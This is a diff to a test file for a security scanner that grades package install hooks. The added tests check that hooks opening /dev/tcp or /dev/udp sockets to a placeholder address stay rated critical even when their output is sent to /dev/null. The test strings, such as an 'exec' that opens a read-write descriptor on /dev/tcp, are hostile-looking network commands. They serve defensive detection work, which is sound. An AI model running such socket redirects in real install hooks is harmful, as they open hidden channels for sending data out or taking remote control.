@@ -1,6 +1,5 @@
 """Install hooks that silence output, or print a constant banner, are not "runs remote /
-shell / eval content" (verdict accuracy audit, 2026-11-14:
-docs/research/verdict-accuracy-audit-2026-11.md).
+shell / eval content" (verdict accuracy audit, 2026-11-14).
 
 ``INSTALL_SCRIPT_DANGER_RE`` counted any ``> /dev/…`` redirect, so the most common way
 to silence a hook (``> /dev/null 2>&1``, ``2>/dev/null || true``) made it critical:
@@ -81,3 +80,24 @@ class TestRecallStaysCritical:
     def test_stays_critical(self, cmd):
         f = _hook(cmd)
         assert f and f[0].severity == "critical", cmd
+
+
+class TestDevTcpUdpAnyRedirectIsCritical:
+    """``/dev/tcp/`` and ``/dev/udp/`` are network sockets whichever way they are
+    redirected; a quiet ``> /dev/null`` next to one must not soften it."""
+
+    def test_input_redirect_from_dev_tcp_with_quiet_stdout(self):
+        f = _hook("node x.js >/dev/null </dev/tcp/1.2.3.4/80")
+        assert f and f[0].severity == "critical"
+
+    def test_output_redirect_to_dev_tcp_with_quiet_stderr(self):
+        f = _hook("node x.js 2>/dev/null >/dev/tcp/1.2.3.4/80")
+        assert f and f[0].severity == "critical"
+
+    def test_exec_read_write_fd_on_dev_tcp(self):
+        f = _hook("exec 3<>/dev/tcp/1.2.3.4/80 >/dev/null 2>&1")
+        assert f and f[0].severity == "critical"
+
+    def test_dev_udp_redirect(self):
+        f = _hook("node x.js &>/dev/null </dev/udp/1.2.3.4/53")
+        assert f and f[0].severity == "critical"
